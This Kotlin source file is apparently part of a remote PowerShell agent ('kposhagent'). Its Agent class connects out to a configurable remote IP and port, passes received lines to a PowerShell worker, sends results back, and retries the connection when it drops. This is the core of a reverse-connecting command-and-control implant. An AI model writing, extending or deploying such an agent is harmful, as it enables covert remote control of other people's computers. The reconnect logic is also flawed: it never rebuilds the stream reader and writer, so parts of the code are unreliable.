package com.tobias.kposhagent

import com.tobias.kposhagent.command.Command
import com.tobias.kposhagent.command.CommandType
import java.io.*
import java.net.ConnectException
import java.net.Socket
import java.util.*
import kotlin.concurrent.timerTask

class Agent(private val remoteIp: String,private val port: Int) : Runnable {
    private var socket : Socket = Socket(remoteIp,port)
    private val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
    private val writer = BufferedWriter(OutputStreamWriter(socket.getOutputStream()))
    private val worker : PowerShellWorker = PowerShellWorker(this)
    init {
        Thread(worker).start()
    }



   override fun run() {
       while(!Thread.interrupted()) {
           if(reader.ready()) {
              worker.process(read())
           }
           Thread.sleep(100)
       }
    }

    private fun read() : String {
        return reader.readLine()
    }

    fun write(command : Command) {
        try {
            println("writing: $command")
            writer.write(command.toString())
            writer.newLine()
            writer.flush()
        } catch(ex: IOException) {
            print("Write failed, reconnecting")
            reconnect()
        }
    }

     fun reconnect() {
         // Close socket in case it's already running
         socket.close()
         val timer : Timer = Timer()
         var connected = false
         timer.scheduleAtFixedRate(timerTask {
             println("Reconnecting...")
             try {
                 socket = Socket(remoteIp,port)
                 connected = true
             } catch (ex: ConnectException) {
                 println("Failled to connect, retrying...")
             }
             if(connected) {
                 println("Connection reestablished!")
                 timer.cancel()
                 timer.purge()
             }
         },5000,4)
     }
}

